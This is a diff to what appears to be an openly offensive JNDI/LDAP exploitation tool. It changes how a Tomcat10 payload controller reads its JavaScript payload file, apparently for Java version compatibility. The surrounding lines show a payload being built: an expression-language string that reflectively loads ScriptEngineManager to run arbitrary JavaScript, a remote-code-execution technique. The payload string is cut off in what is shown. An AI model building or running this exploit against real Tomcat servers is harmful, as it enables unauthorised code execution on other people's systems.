@@ -10,8 +10,9 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
-import java.nio.file.Path;
+import java.nio.file.Paths;
 
 import static artsploit.Utilities.makeJavaScriptString;
 import static artsploit.Utilities.serialize;
@@ -49,7 +50,8 @@ public class Tomcat10 implements LdapController {
 
         } else {
             System.out.println("Using payload from " + Config.jsPayloadPath);
-            String jsScript = Files.readString(Path.of(Config.jsPayloadPath));
+            String jsScript = new String(Files.readAllBytes(Paths.get(Config.jsPayloadPath)), StandardCharsets.UTF_8);
+
             payload = ("{" +
                     "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                     ".newInstance().getEngineByName(\"JavaScript\")" +
